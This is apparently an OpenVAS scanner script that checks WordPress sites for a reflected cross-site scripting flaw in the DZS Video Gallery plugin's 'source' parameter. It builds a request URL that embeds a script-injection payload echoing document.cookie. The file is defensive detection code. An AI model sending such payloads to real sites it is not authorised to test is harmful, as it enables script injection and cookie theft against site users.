###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_wordpress_dzs_videogallery_xss_vuln.nasl 35140 2014-02-17 13:01:09Z Feb$
#
# WordPress DZS Video Gallery 'source' Parameter Cross Site Scripting Vulnerability
#
# Authors:
# Thanga Prakash S <tprakash@secpod.com>
#
# Copyright:
# Copyright (C) 2014 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

SCRIPT_OID  = "1.3.6.1.4.1.25623.1.0.804098";
CPE = "cpe:/a:wordpress:wordpress";

if(description)
{
  script_oid(SCRIPT_OID);
  script_version("$Revision: 6769 $");
  script_bugtraq_id(65526);
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"last_modification", value:"$Date: 2017-07-20 11:56:33 +0200 (Thu, 20 Jul 2017) $");
  script_tag(name:"creation_date", value:"2014-02-17 13:01:09 +0530 (Mon, 17 Feb 2014)");
  script_name("WordPress DZS Video Gallery 'source' Parameter Cross Site Scripting Vulnerability");

  tag_summary =
"This host is installed with Wordpress DZS Video Gallery Plugin and is prone to
cross site scripting vulnerability.";

  tag_vuldetect =
"Send a crafted data via HTTP GET request and check whether it is able to read
cookie or not.";

  tag_insight =
"Input passed via the 'source' parameter to /dzs-videogallery/ajax.php script
is not properly sanitized before being returned to the user.";

  tag_impact =
"Successful exploitation will allow attacker to execute arbitrary HTML and
script code in a user's browser session in the context of an affected site

Impact Level: Application";

  tag_affected =
"WordPress DZS-VideoGallery Plugin";

  tag_solution =
"No Solution or patch is available as of 17th February, 2014. Information
regarding this issue will be updated once the solution details are available.
For updates refer to http://digitalzoomstudio.net";


  script_tag(name : "summary" , value : tag_summary);
  script_tag(name : "vuldetect" , value : tag_vuldetect);
  script_tag(name : "insight" , value : tag_insight);
  script_tag(name : "impact" , value : tag_impact);
  script_tag(name : "affected" , value : tag_affected);
  script_tag(name : "solution" , value : tag_solution);
  script_tag(name:"solution_type", value:"NoneAvailable");

  script_xref(name : "URL" , value : "http://secunia.com/advisories/56904");
  script_xref(name : "URL" , value : "https://cxsecurity.com/issue/WLB-2014020105");
  script_xref(name : "URL" , value : "http://packetstormsecurity.com/files/125179");
  script_xref(name : "URL" , value : "http://www.securelist.com/en/advisories/56904");
  script_xref(name : "URL" , value : "http://exploitsdownload.com/exploit/na/wordpress-dzs-videogallery-cross-site-scripting");
  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_copyright("Copyright (C) 2014 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("secpod_wordpress_detect_900182.nasl");
  script_mandatory_keys("wordpress/installed");
  script_require_ports("Services/www", 80);
  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

## Variable Initialization
http_port = 0;
dir = "";
url = "";

## Get HTTP Port
if(!http_port = get_app_port(cpe:CPE, nvt:SCRIPT_OID)){
  exit(0);
}

## Get WordPress Location
if(!dir = get_app_location(cpe:CPE, nvt:SCRIPT_OID, port:http_port)){
  exit(0);
}

## Construct the attack request
url = dir + '/wp-content/plugins/dzs-videogallery/ajax.php?ajax=true'+
            '&height=400&width=610&type=vimeo&source="/><script>aler'+
                                       't(document.cookie);</script>';

## Confirm the Exploit
## Extra Check is not possible
if(http_vuln_check(port:http_port, url:url, check_header:TRUE,
   pattern:"<script>alert\(document.cookie\);</script>"))
{
  security_message(http_port);
  exit(0);
}
